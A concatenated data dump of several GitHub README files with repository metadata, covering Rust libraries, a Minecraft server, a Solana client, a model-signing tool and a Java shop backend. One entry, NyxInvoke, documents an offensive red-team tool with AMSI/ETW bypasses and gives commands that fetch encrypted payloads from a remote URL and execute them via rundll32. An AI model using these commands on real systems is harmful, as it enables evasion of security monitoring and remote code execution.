    <a href=""https://app.codecov.io/github/ccbrown/iocraft""><img src=""https://img.shields.io/codecov/c/github/ccbrown/iocraft"" alt=""Codecov"" /></a>
  </p>
</div>

`iocraft` is a library for crafting beautiful text output and interfaces for the terminal or
logs. It allows you to easily build complex layouts and interactive elements using a
declarative API.

## Features

- Define your UI using a clean, highly readable syntax.
- Organize your UI using flexbox layouts powered by [`taffy`](https://docs.rs/taffy/).
- Output colored and styled UIs to the terminal or ASCII output anywhere else.
- Create animated or interactive elements with event handling and hooks.
- Build fullscreen terminal applications with ease.
- Pass props and context by reference to avoid unnecessary cloning.
- Broad support for both Unix and Windows terminals so your UIs look great everywhere.

## Getting Started

If you're familiar with React, you'll feel right at home with `iocraft`. It uses all the same
concepts, but is text-focused and made for Rust.

Here's your first `iocraft` program:

```rust
use iocraft::prelude::*;

fn main() {
    element! {
        Box(
            border_style: BorderStyle::Round,
            border_color: Color::Blue,
        ) {
            Text(content: ""Hello, world!"")
        }
    }
    .print();
}
```

<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/hello-world.png"" height=237 />

Your UI is composed primarily via the `element!` macro, which allows you to
declare your UI elements in a React/SwiftUI-like syntax.

`iocraft` provides a few built-in components, such as `Box`, `Text`, and
`TextInput`, but you can also create your own using the `#[component]` macro.

For example, here's a custom component that uses a hook to display a counter
which increments every 100ms:

```rust
use iocraft::prelude::*;
use std::time::Duration;

#[component]
fn Counter(mut hooks: Hooks) -> impl Into<AnyElement<'static>> {
    let mut count = hooks.use_state(|| 0);

    hooks.use_future(async move {
        loop {
            smol::Timer::after(Duration::from_millis(100)).await;
            count += 1;
        }
    });

    element! {
        Text(color: Color::Blue, content: format!(""counter: {}"", count))
    }
}

fn main() {
    smol::block_on(element!(Counter).render_loop()).unwrap();
}
```

<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/counter.svg"" />

## More Examples

There are many [examples on GitHub](https://github.com/ccbrown/iocraft/tree/main/examples) which
demonstrate various concepts such as tables, progress bars, fullscreen apps,
forms, and more!

<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/table.png"" height=402 />
<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/form.png"" height=387 />
<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/overlap.png"" height=450 />
<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/calculator.png"" height=450 />
<img src=""https://raw.githubusercontent.com/ccbrown/iocraft/refs/heads/main/examples/images/weather-powershell.png"" height=350 />

## Shoutouts

`iocraft` was inspired by [Dioxus](https://github.com/DioxusLabs/dioxus) and
[Ink](https://github.com/vadimdemedes/ink), which you should also check out,
especially if you're building graphical interfaces or interested in using
JavaScript/TypeScript.

You may also want to check out [Ratatui](https://github.com/ratatui/ratatui),
which serves a similar purpose with a less declarative API.

## License

Licensed under either of

 * Apache License, Version 2.0
   ([LICENSE-APACHE](LICENSE-APACHE) or http://www.apache.org/licenses/LICENSE-2.0)
 * MIT license
   ([LICENSE-MIT](LICENSE-MIT) or http://opensource.org/licenses/MIT)

at your option.

## Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in the work by you, as defined in the Apache-2.0 license, shall be
dual licensed as above, without any additional terms or conditions.
",19,3,1,Apache-2.0,"commit.yaml,release-plz.yaml",23.0
maxomatic458/bedwa-rs,master,"> [!NOTE]
> Parts of the server logic will be separated into [this](https://github.com/maxomatic458/valence-extra) repository (to make them more reusable).
> So a rewrite will probably happen before larger features can be added.  

# Bedwa-rs
A minecraft bedwars server written entirely in rust with [valence](https://github.com/valence-rs/valence)

# Current/Future Features 
- [X] Mostly vanilla combat system, that supports most pvp enchants and also bows & arrows
- [X] Use custom bedwars maps
- [X] Configurable shops
- [X] Configurable resource spawners
- [X] Chests & Enderchets (still some bugs with that)
- [ ] Potions
- [ ] Custom Items

# Getting started

* Download the binary from the release page or build it yourself with `cargo build --release`.
* Setup the directory as shown below (the world folder should be a 1.20.1 bedwars map with all blocks, beds and chests placed already)
  ```
  world/
  shop.json
  ```
* Run the ``bedwa-rs`` binary in the directory.

# Configuring the server
When you run the server for the first time, you will be placed in an edit mode.
Now you can use the items in your hotbar and the chat commands to configure the server.

## Chat commands
* `/bwa arenabounds <pos1> <pos2>`: Set the arena bounds.

* `/bwa team add <team_name> <team_color>`: Add a team.

* `/bwa team remove <team_name>`: Remove a team.

* `/bwa team spawn <team_name> <pos>`: Set the spawn of a team.

* `/bwa team bed <team_name> <pos>`: Set the bed of a team.

* `/bwa shop <team_name> <pos> <yaw> <team?>`: Place a shop (team is optional, when it is set, then the shop will only spawn if the team is in the match).

* `/bwa shop remove <pos>`: Remove a shop.

* `/bwa spawner add <pos> <resource> <interval> <amount> <team?>`: Add a resource spawner, `resource` is the minecraft item id, like `iron_ingot`, `interval` is the time in seconds between spawns, `amount` is the amount of items spawned, `team` is optional, when it is set, then the spawner will only spawn if the team is in the match.

* `/bwa spawner remove <pos>`: Remove a resource spawner.

* `/bwa lobby spawn <pos>`: Set the lobby spawn.

* `/bwa spectator spawn <pos>`: Set the spectator spawn.

* `/bwa summary`: Print a summary of the current configuration.

* ~~`/bwa help`: Print a list of all commands.~~ (not implemented yet)

* `/bwa save`: Save the configuration to disk, then you can restart the server to go into play mode.

## Shop configuration
The shop configuration is stored in the `shop.json` file in the server directory.
The file has this structure:
```jsonc
{
    ""shop_items"": {
        ""BlockCategory"": [ // Name of the category in the shop
            {
                ""item"": ""white_wool"", // Item for that category
                ""count"": 1,
                ""nbt"": null,
            },
            [ // List of items that can be bought
                {
                    ""offer"": {
                        ""item"": ""white_wool"",
                        ""count"": 4,
                        ""nbt"": null,
                    },
                    ""price"": {
                        ""item"": ""iron_ingot"",
                        ""count"": 1,
                        ""nbt"": null,
                    }
                }
            ]
        ]
    }
}
```

This is how an enchanted item would look like:
```jsonc
    {
        ""offer"": {
        ""item"": ""diamond_sword"",
        ""count"": 1,
        ""nbt"": {
            ""display"": {
                ""Lore"": [
                    ""{\""text\"":\""10 Gold\"", \""italic\"": \""false\"", \""bold\"": \""true\"", \""color\"": \""gold\""}'}}""
                ]
            },
            ""Enchantments"": [
            {
                ""id"": ""minecraft:sharpness"",
                ""lvl"": 1
            },
            {
                ""id"": ""minecraft:fire_aspect"",
                ""lvl"": 1
            },
            {
                ""id"": ""minecraft:knockback"",
                ""lvl"": 1
            }
            ]
        }  
        },
        ""price"": {
        ""item"": ""gold_ingot"",
        ""count"": 10,
        ""nbt"": null
        }
    }
```

",0,3,1,MIT,"rust.yml,typos.yml",0.0
hexishq/velos,main,"![thumb](https://github.com/user-attachments/assets/900efffb-c453-44c1-bda8-a22fb5ce0dfa)
![velos](https://github.com/user-attachments/assets/bdc33f74-3873-4a35-8362-3855fd4729ff)

# Velos

Velos is a specialized data streaming client for Solana that dramatically reduces infrastructure costs through efficient decoupling of the data reception layer.

By focusing solely on processing shreds, verifying them, constructing entries, and receiving gossip votes for commitment tracking, Velos provides a lightweight solution that can run on minimal hardware while maintaining full data parity.

## Why Velos?

Traditional access to real-time Solana data requires running full nodes with complete runtime and related services - excessive overhead when your goal is data streaming. Velos solves this by:

- **Focused Architecture:** Processes only essential data components
- **Minimal Resources:** Runs on lightweight infrastructure
- **Cost Efficiency:** Reduces infrastructure costs by 50x
- **Global Scalability:** Deploy multiple instances easily
- **Zero DevOps:** Simple setup and maintenance

### For Institutions

- Deploy globally with minimal costs
- Superior scalability with lightweight instances
- Simple redundancy across regions
- Full data parity without infrastructure complexity

### For Developers

- Efficient data streaming without full node overhead
- Minimalist approach focused on essential data flow
- Zero infrastructure knowledge needed
- Focus on building, not maintenance

## Features

- **Optimized Data Reception:**
  - Direct shred processing
  - Entry construction
  - Transaction streaming
  - Commitment tracking via gossip
- **Efficient Architecture:**

  - Minimal resource consumption
  - Streamlined data flow
  - High-performance processing

- **Developer Tools:**
  - gRPC API
  - Rust crate integration
  - Simple configuration
  - Plugin system (coming soon)

## Installation (Coming Soon)

### As a Crate

```toml
[dependencies]
velos = ""0.0.1""
```

### As a Service

```bash
git clone https://github.com/hexishq/velos.git
cd velos
cargo run --release
```

## Roadmap

Phase 1: v0 - Core Data Streaming (Q4 2024)

- [ ] Gossip Protocol Connection
- [ ] Turbine Integration
  - [ ] Shred reception and verification
  - [ ] Entry processing
  - [ ] Transaction streaming
- [ ] Jito Integration
- [ ] gRPC Implementation

Phase 2: v1 - Plugin System

- [ ] Geyser Interface Layer
- [ ] Adaptable Plugin Architecture
- [ ] Extended API Support

## Contributing

We welcome contributions! Feel free to:

- Open issues for bugs or feature requests
- Submit pull requests
- Join discussions
- Share feedback

## License

Velos is licensed under the Apache 2.0 License. See `LICENSE` for details.

## Acknowledgments

Built with inspiration from the Solana community and a commitment to making blockchain infrastructure more accessible for everyone.
",0,4,1,Apache-2.0,,6.0
BlackSnufkin/NyxInvoke,main,"# NyxInvoke

NyxInvoke is a versatile Rust-based tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities. It can be compiled as either a standalone executable or a DLL.

## Features

- Execute .NET assemblies
- Run PowerShell commands or scripts
- Load and execute Beacon Object Files (BOFs)
- Built-in patchless AMSI (Anti-Malware Scan Interface) bypass
- Built-in patchless ETW (Event Tracing for Windows) bypass
- Support for encrypted payloads with AES decryption
- Flexible input options: local files, URLs, or compiled-in data
- Dual-build support: can be compiled as an executable or a DLL

## Building

NyxInvoke can be built as either an executable or a DLL. Use the following commands:

### Executable

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features exe --bin NyxInvoke
```

### DLL

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features dll --lib
```

To include compiled-in CLR or BOF data, add the respective features:

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features=exe,compiled_clr,compiled_bof --bin NyxInvoke
```
or
```
cargo +nightly build --release --target=x86_64-pc-windows-msvc --features=dll,compiled_clr,compiled_bof --lib
```

## Usage

### Executable Mode

The executable supports three main modes of operation:

1. CLR Mode (.NET assembly execution)
2. PowerShell Mode
3. BOF Mode (Beacon Object File execution)

#### General Syntax

```
NyxInvoke.exe <mode> [OPTIONS]
```

Where `<mode>` is one of: `clr`, `ps`, or `bof`.

### DLL Mode

When compiled as a DLL, NyxInvoke can be executed using rundll32. The syntax is:

```
rundll32.exe NyxInvoke.dll,NyxInvoke <mode> [OPTIONS]
```

### Mode-Specific Options

1. CLR Mode:
```text
Execute Common Language Runtime (CLR) assemblies

Usage: NyxInvoke.exe clr [OPTIONS]

Options:
      --args <ARGS>...            Arguments to pass to the assembly
      --base <URL_OR_PATH>        Base URL or path for resources
      --key <KEY_FILE>            Path to the encryption key file
      --iv <IV_FILE>              Path to the initialization vector (IV) file
      --assembly <ASSEMBLY_FILE>  Path or URL to the encrypted assembly file to execute
  -h, --help                      Print help (see more with '--help')

Example: NyxInvoke.exe clr --assembly payload.enc --key key.bin --iv iv.bin --args ""arg1 arg2""
```

2. PowerShell Mode:
```text
Execute PowerShell commands or scripts

Usage: NyxInvoke.exe ps [OPTIONS]

Options:
      --command <COMMAND>  PowerShell command to execute
      --script <SCRIPT>    Path to PowerShell script file to execute
  -h, --help               Print help (see more with '--help')

Examples:
NyxInvoke.exe ps --command ""Get-Process""
NyxInvoke.exe ps --script script.ps1
```

3. BOF Mode:
```text
Execute Beacon Object Files (BOF)

Usage: NyxInvoke.exe bof [OPTIONS]

Options:
      --args <ARGS>...      Arguments to pass to the BOF
      --base <URL_OR_PATH>  Base URL or path for resources
      --key <KEY_FILE>      Path to the encryption key file
      --iv <IV_FILE>        Path to the initialization vector (IV) file
      --bof <BOF_FILE>      Path or URL to the encrypted BOF file to execute
  -h, --help                Print help (see more with '--help')

Example: NyxInvoke.exe bof --bof payload.enc --key key.bin --iv iv.bin --args ""arg1 arg2""
```

## Examples

### Executable Mode

1. CLR Mode (Remote Execution):
   ```
   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Script Execution):
   ```
   NyxInvoke.exe ps --script C:\path\to\script.ps1
   ```

3. BOF Mode (Local Execution):
   ```
   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args ""str=argument1"" ""int=42""
   ```

### DLL Mode

1. CLR Mode (Remote Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Direct Command Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke ps --command ""Get-Process | Select-Object Name, ID""
   ```

3. BOF Mode (Compiled Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke bof --args ""str=argument1"" ""int=42""
   ```


## Test Resources

In the `resources` directory, you'll find several files to test NyxInvoke's functionality:

1. Encrypted CLR Assembly (Seatbelt):
   - File: `clr_data.enc`
   - Description: An encrypted version of the Seatbelt tool, a C# project for gathering system information.
   - Usage example:
     ```
     NyxInvoke.exe clr --key resources/clr_aes.key --iv resources/clr_aes.iv --assembly resources/clr_data.enc --args AntiVirus
     ```

2. Encrypted BOF (Directory Listing):
   - File: `bof_data.enc`
   - Description: An encrypted Beacon Object File that List user permissions for the specified file, wildcards supported.
   - Usage example:
     ```
     NyxInvoke.exe bof --key resources/bof_aes.key --iv resources/bof_aes.iv --bof resources/bof_data.enc --args ""wstr=C:\Windows\system32\cmd.exe""
     ```

## Screenshot


- Dll Compiled CLR Executaion 

![Screenshot 2024-09-18 123147](https://github.com/user-attachments/assets/dd58adbc-50f2-4eb4-9a33-0851bacfe754)


- EXE Remote BOF Executaion 

![Screenshot 2024-09-18 123410](https://github.com/user-attachments/assets/54a20996-7cf3-4cbb-ab4d-6e7973094e80)


- Dll Powershell Script Executaion 

![Screenshot 2024-09-18 123547](https://github.com/user-attachments/assets/6c1e2f53-0d85-45e8-8a38-4a6dcb08a767)




## Legal Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.

## Credits

- @yamakadi for the [clroxide](https://github.com/yamakadi/clroxide) project
- @hakaioffsec for the [coffee](https://github.com/hakaioffsec/coffee) project
",0,0,1,GPL-3.0,,0.0
dreadnode/tensor-man,main,"
<p align=""center"">
  <a href=""https://github.com/dreadnode/tensor-man/releases/latest""><img alt=""Release"" src=""https://img.shields.io/github/release/dreadnode/tensor-man.svg?style=fl_pathat-square""></a>
  <a href=""https://crates.io/crates/tensor-man""><img alt=""Crate"" src=""https://img.shields.io/crates/v/tensor-man.svg""></a>
  <a href=""https://hub.docker.com/r/dreadnode/tensor-man""><img alt=""Docker Hub"" src=""https://img.shields.io/docker/v/dreadnode/tensor-man?logo=docker""></a>
  <a href=""https://rust-reportcard.xuri.me/report/github.com/dreadnode/tensor-man""><img alt=""Rust Report"" src=""https://rust-reportcard.xuri.me/badge/github.com/dreadnode/tensor-man""></a>
  <a href=""#""><img alt=""GitHub Actions Workflow Status"" src=""https://img.shields.io/github/actions/workflow/status/dreadnode/tensor-man/test.yml""></a>
  <a href=""https://github.com/dreadnode/tensor-man/blob/master/LICENSE.md""><img alt=""Software License"" src=""https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square""></a>
</p>

`tensor-man` is a utility to inspect, validate, sign and verify machine learning model files.

## Supported Formats

* [safetensors](https://github.com/huggingface/safetensors)
* [ONNX](https://onnx.ai/)
* [GGUF](https://huggingface.co/docs/hub/gguf)
* [PyTorch](https://pytorch.org/)

> [!IMPORTANT]
> PyTorch models are loaded and inspected in a networkless Docker container in order to prevent [unintended code execution](https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models) on the host machine.

## Install with Cargo

This is the recommended way to install and use the tool:

```bash
cargo install tensor-man
```

## Pull from Docker Hub

```bash
docker pull dreadnode/tensor-man:latest
```

## Build Docker image

To build your own Docker image for the tool, run:

```bash
docker build . -t tman  
```

## Note about Docker

If you want to inspect PyTorch models and you are using `tensor-man` inside a container, make sure to share the docker socket from the host machine with the container:

```bash
docker run -it \
  # these paths must match
  -v/path/to/pytorch_model.bin:/path/to/pytorch_model.bin \
  # allow the container itself to instrument docker on the host
  -v/var/run/docker.sock:/var/run/docker.sock \
  # the rest of the command line
  tman inspect /path/to/pytorch_model.bin
```

## Build from source

Alternatively you can build the project from source, in which case you'll need to have Rust and Cargo [installed on your system](https://rustup.rs/).

Once you have those set up, clone the repository and build the project:

```bash
cargo build --release
```

The compiled binary will be available in the `target/release` directory. You can run it directly or add it to your system's PATH:

```bash
# Run directly
./target/release/tman

# Or, copy to a directory in your PATH (e.g., /usr/local/bin)
sudo cp target/release/tman /usr/local/bin/
```

## Usage

### Inspect

Inspect a file and print a brief summary:

```bash
tman inspect /path/to/whatever/llama-3.1-8b-instruct.safetensors
```

Print detailed information about each tensor:

```bash
tman inspect /path/to/whatever/llama-3.1-8b-instruct.safetensors --detail full
```

Filter by tensor name:

```bash
tman inspect /path/to/whatever/llama-3.1-8b-instruct.onnx -D full --filter ""q_proj""
```

Save the output as JSON:

```bash
tman inspect /path/to/whatever/llama-3.1-8b-instruct.gguf -D full --to-json output.json
```

### Sign and Verify

The tool allows you to generate an Ed25519 key pair to sign your models:

```bash
tman create-key --private-key private.key --public-key public.key
```

Then you can use the private key to sign a model (this will automatically include and sign external data files if referenced by the format):

```bash
# this will generate the tinyyolov2-8.signature file
tman sign /path/to/whatever/tinyyolov2-8.onnx -K /path/to/private.key

# you can provide a safetensors index file and all files referenced by it will be signed as well
tman sign /path/to/whatever/Meta-Llama-3-8B/model.safetensors.index.json -K /path/to/private.key

# this will sign the entire model folder with every file in it
tman sign /path/to/whatever/Meta-Llama-3-8B/ -K /path/to/private.key
```
And the public one to verify the signature:

```bash
# will verify the signature in tinyyolov2-8.signature
tman verify /path/to/whatever/tinyyolov2-8.onnx -K /path/to/public.key

# will verify with an alternative signature file 
tman verify /path/to/whatever/tinyyolov2-8.onnx -K /path/to/public.key --signature /path/to/your.signature

# this will verify every file in the model folder
tman sign /path/to/whatever/Meta-Llama-3-8B/ -K /path/to/public.key
```

### Inference Graph

Generate a .dot file for the execution graph of an ONNX model:

```bash
tman graph /path/to/whatever/tinyyolov2-8.onnx --output tinyyolov2-8.dot
```

### More

For the full list of commands and options, run:

```bash
tman --help

# get command specific help
tman inspect --help
```

## License

This tool is released under the GPL 3 license. To see the licenses of the project dependencies, install cargo license with `cargo install cargo-license` and then run `cargo license`.",5,0,1,NOASSERTION,"docker-build.yml,test.yml",0.0
fortress-build/whirlwind,main,"# üåÄ Whirlwind

[![Build Status](https://img.shields.io/github/actions/workflow/status/fortress-build/whirlwind/rust.yml?branch=main)](https://github.com/yourusername/shardmap/actions)
[![Crates.io](https://img.shields.io/crates/v/whirlwind)](https://crates.io/crates/whirlwind)
[![Docs.rs](https://docs.rs/whirlwind/badge.svg)](https://docs.rs/whirlwind)
[![License](https://img.shields.io/crates/l/whirlwind)](https://github.com/fortress-build/whirlwind/blob/main/LICENSE)

An asynchronous, sharded `HashMap` for high-performance concurrent data access
in Rust.

> [!NOTE]
> This crate is in development, and breaking changes may be made up until a 1.0 release.

## üìñ Table of Contents

- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Examples](#-examples)
- [Benchmark](#-benchmarks)
- [Contributing](#-contributing)
- [License](#license)

## ‚ú® Features

- **Async Ready**: Seamless integration with Rust's `async`/`await` syntax.
- **High Performance**: Sharding minimizes lock contention in concurrent environments.
- **Thread-safe**: Safe for use across multiple threads without fear of data races.
- **Familiar API**: Intuitive `HashMap`-like interface for ease of adoption.
- **Customizable Shards**: Configure the number of shards to optimize for your workload.

## üì¶ Installation

Add `whirlwind` to your `Cargo.toml`:

```toml
[dependencies]
whirlwind = ""0.1.1""
```

## üîß Usage

Here's a quick example to get you started:

```rust
use whirlwind::ShardMap;

#[tokio::main]
async fn main() {
    let map = ShardMap::new();

    map.insert(""apple"", 3).await;
    map.insert(""banana"", 5).await;

    if let Some(quantity) = map.get(&""apple"").await {
        println!(""We have {} apples!"", quantity);
    }

    map.remove(&""banana"").await;
}
```

## üìö Examples

### Concurrent Inserts

```rust
use whirlwind::ShardMap;
use tokio::task::JoinSet;

#[tokio::main]
async fn main() {
    let map = ShardMap::new();
    let tasks: JoinSet<_> = (0..1000).map(|i| {
        let map = map.clone();
        tokio::spawn(async move {
            map.insert(i, i * 2).await;
        })
    }).collect();

    tasks.join_all().await.ok();

    assert_eq!(map.len().await, 1000);
}
```

### Custom Shard Count

```rust
use whirlwind::ShardMap;

#[tokio::main]
async fn main() {
    let map = ShardMap::with_shards(64); // Initialize with 64 shards
    // Use the map as needed
}
```

## üìä Benchmarks

Benchmarks were run in a asyncified version of [this benchmark](https://github.com/xacrimon/conc-map-bench). You can
find it [here](https://github.com/willothy/conc-map-bench). Since the benchmarks use [`jonhoo/bustle`](https://github.com/jonhoo/bustle),
an asyncified fork of that library ([here](https://github.com/willothy/bustle)) is required.

Machine: Apple M3 Max (2023 16-inch MacBook Pro, 36GB RAM)

OS: macOS 15.0

See the `results/` directory.

### Read Heavy (std hasher)

| | |
:-------------------------:|:-------------------------:
![](results/ReadHeavy.std.throughput.svg) | ![](results/ReadHeavy.std.latency.svg)

### Exchange (std hasher)

| | |
:-------------------------:|:-------------------------:
![](results/Exchange.std.throughput.svg) | ![](results/Exchange.std.latency.svg)

### Rapid Grow (std hasher)

| | |
:-------------------------:|:-------------------------:
![](results/RapidGrow.std.throughput.svg) | ![](results/RapidGrow.std.latency.svg)

### Read Heavy (ahash)

| | |
:-------------------------:|:-------------------------:
![](results/ReadHeavy.ahash.throughput.svg) | ![](results/ReadHeavy.ahash.latency.svg)

### Exchange (ahash)

| | |
:-------------------------:|:-------------------------:
![](results/Exchange.ahash.throughput.svg) | ![](results/Exchange.ahash.latency.svg)

### Rapid Grow (ahash)

| | |
:-------------------------:|:-------------------------:
![](results/RapidGrow.ahash.throughput.svg) | ![](results/RapidGrow.ahash.latency.svg)

## ü§ù Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a new branch: `git checkout -b feature/your-feature`.
3. Commit your changes: `git commit -am 'Add your feature'`.
4. Push to the branch: `git push origin feature/your-feature`.
5. Open a pull request.

### Running Tests

Ensure all tests pass before submitting a PR:

```sh
cargo test
```

### Code Style

We use `rustfmt` for code formatting:

```sh
cargo fmt -- --check
```

## License

Copyright 2024 Will Hopkins

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   <http://www.apache.org/licenses/LICENSE-2.0>

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

---

Made with üíñ and Rust.
",2,5,1,Apache-2.0,"release.yml,rust.yml",4.0
anonystick/JAVA-ecommerce-backend-api-MEMBER,main,"# Java E-commerce Backend - Open Source Project

## Overview

Welcome to the [Java E-commerce Backend open-source - shopdevjava.com](https://www.youtube.com/channel/UCky92hx0lZxVBi2BJ6Zm2Hg/join) project! This project aims to build a backend system for an e-commerce platform similar to Shopee (Version LITE). Our goal is to provide a robust, scalable, and flexible system to handle core e-commerce functionalities such as product management, orders, payments, inventory, etc.

This backend is developed in Java, utilizing modern frameworks and libraries, and follows best practices in software engineering. We encourage contributions and participation from the open-source community.

## How to Become a Contributor
If you are interested in contributing to this project, please follow the steps outlined in our contribution guidelines. We encourage all contributors to:
- Fork the repository. `https://github.com/anonystick/JAVA-ecommerce-backend-api-MEMBER.git`
- Create a feature branch.
- Commit your changes.
- Open a pull request for review.

The best approach is to follow this guide if you are new: [H∆∞·ªõng d·∫´n L·∫≠p Tr√¨nh Vi√™n tham gia PR v√†o c·ªông ƒë·ªìng OpenSource](https://www.youtube.com/watch?v=82oFC6cO5lg)

## Mind maps

### Project Architecture

1. Operating platform

![Project Architecture](./docs/images/0001-vanhanh.png)

2. Shop Management
![Shop Management](./docs/images/0002-shop-manager.png)

3. User Management
![User Management](./docs/images/0003-user-manager.png)

4. Product Management

![Product Management](./docs/images/0004-product.png)

## Features

FULL PLAYLIST: [PLAYLIST - Con ƒë∆∞·ªùng tr·ªü th√†nh L·∫¨P TR√åNH VI√äN BACKEND JAVA](https://www.youtube.com/playlist?list=PLw0w5s5b9NK5Trt3AIxCtpRHWR7nI0RyX)

- **User Management**
  - User Registration and Authentication
  - Password Management
  - Profile Management
  - Two-factor authentication (2FA)
  
- **Product Management**
  - Add, Update, Delete Products
  - Categories and Tags
  - Search and Filter Products
  - Reviews and Ratings

- **Order Management**
  - Create, Update, Cancel Orders
  - Order Tracking
  - Payment Integration (Stripe, PayPal, etc.)
  - Order Status Notifications

- **Cart and Wishlist**
  - Add to Cart
  - Manage Wishlist

- **Inventory Management**
  - Stock Levels per Product
  - Backorders and Inventory Tracking

- **Shipping and Delivery**
  - Integration with shipping services (FedEx, DHL, etc.)
  - Real-time Shipping Rates and Estimated Delivery Time
  - Order Dispatch and Delivery Tracking

- **Payments**
  - Support Multiple Payment Methods
  - Payment Gateway Integration (Stripe, PayPal, etc.)
  - Refunds and Returns
  
- **Admin Dashboard**
  - Manage Users, Products, Orders, and Reviews
  - Analytics for Sales, Revenue, and User Behavior
  
- **Notifications**
  - Email and SMS Notifications for Orders and Shipping
  - Push Notifications

## Technologies

- **Java 17**
- **Spring Boot** (for RESTful APIs)
- **Hibernate / JPA** (for ORM and database interaction)
- **MySQL / PostgreSQL** (for data storage)
- **Redis** (for caching and session management)
- **Kafka / RabbitMQ** (for messaging and event-driven architecture)
- **ElasticSearch** (for search and filtering products)
- **Swagger** (for API documentation)
- **Docker** (for containerization)
- **Junit** and **Mockito** (for testing)
- **OAuth 2.0** and **JWT** (for authentication and security)

## Project Structure MVC 

```bash
ecommerce-backend
‚îú‚îÄ‚îÄ src/main/java/com/anonystick/ecommerce
‚îÇ   ‚îú‚îÄ‚îÄ controller/            # REST API Controllers
‚îÇ   ‚îú‚îÄ‚îÄ service/               # Business Logic
‚îÇ   ‚îú‚îÄ‚îÄ model/                 # Data Models (Entities)
‚îÇ   ‚îú‚îÄ‚îÄ repository/            # Data Access Layer
‚îÇ   ‚îú‚îÄ‚îÄ config/                # Configuration files
‚îÇ   ‚îú‚îÄ‚îÄ exception/             # Custom Exceptions
‚îÇ   ‚îî‚îÄ‚îÄ dto/                   # Data Transfer Objects (DTO)
‚îú‚îÄ‚îÄ src/main/resources
‚îÇ   ‚îú‚îÄ‚îÄ application.yml        # Spring Boot Configuration
‚îú‚îÄ‚îÄ Dockerfile
‚îú‚îÄ‚îÄ docker-compose.yml
‚îú‚îÄ‚îÄ pom.xml                    # Maven Dependencies
‚îî‚îÄ‚îÄ README.md
```

## Project Structure DDD


```
.
‚îú‚îÄ‚îÄ MEMBER.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ mvnw
‚îú‚îÄ‚îÄ mvnw.cmd
‚îú‚îÄ‚îÄ myshop-framework
‚îÇ   ‚îî‚îÄ‚îÄ pom.xml
‚îú‚îÄ‚îÄ myshop-module-buyer
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ BuyerApplicationApi.java
‚îú‚îÄ‚îÄ myshop-module-manager
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ ManagerApplicationApi.java
‚îú‚îÄ‚îÄ myshop-module-store
‚îÇ   ‚îú‚îÄ‚îÄ pom.xml
‚îÇ   ‚îî‚îÄ‚îÄ src
‚îÇ       ‚îî‚îÄ‚îÄ main
‚îÇ           ‚îî‚îÄ‚îÄ java
‚îÇ               ‚îî‚îÄ‚îÄ com
‚îÇ                   ‚îî‚îÄ‚îÄ myshop
‚îÇ                       ‚îî‚îÄ‚îÄ StoreApplicationApi.java
‚îî‚îÄ‚îÄ pom.xml
```

## Task Checklist

### User Management
- [ ] User Registration (Sign-up)
- [ ] User Authentication (Login/Logout)
- [ ] Implement JWT Token for Authentication
- [ ] Password Reset and Update
- [ ] Two-factor Authentication (2FA)
- [ ] Profile Management (Edit Profile, Upload Avatar)

### Product Management
- [ ] Create Product
- [ ] Update Product Details
- [ ] Delete Product
- [ ] Implement Search and Filter by Category
- [ ] Add Product Reviews and Ratings

### Order Management
- [ ] Create New Order
- [ ] Update Order Status (Processing, Shipped, Delivered, etc.)
- [ ] Cancel Order
- [ ] Integrate with Payment Gateway (Stripe/PayPal)
- [ ] Track Order Status and Delivery

### Cart and Wishlist
- [ ] Add to Cart
- [ ] View Cart and Checkout
- [ ] Add to Wishlist
- [ ] Remove from Cart/Wishlist

### Inventory Management
- [ ] Track Stock Levels for Products
- [ ] Handle Out-of-Stock Situations
- [ ] Implement Inventory Notification (Low Stock)

### Shipping and Delivery
- [ ] Integrate with Shipping APIs (FedEx/DHL)
